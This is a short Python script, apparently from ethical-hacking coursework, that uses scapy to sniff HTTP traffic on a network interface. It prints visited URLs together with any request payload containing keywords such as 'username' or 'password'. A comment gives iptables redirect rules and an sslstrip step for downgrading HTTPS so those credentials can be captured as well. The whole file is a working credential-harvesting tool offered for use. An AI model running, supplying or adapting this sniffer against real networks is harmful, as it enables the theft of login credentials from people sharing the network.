#!/usr/bin/env python
import scapy.all as scapy
# from scapy.layers import http
import scapy_http.http as http

# pip install scapy-http
# @TODO: to work with HTTPS needs to use SSLstrip:
# iptables --flush
# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
# another terminal the command: sslstrip
# add get default interface
 
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
 
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
 
def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load
 
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] I think I get a possible login information at > " + url + " >> " + login_info + "\n\n")
 
 
sniff("eth0")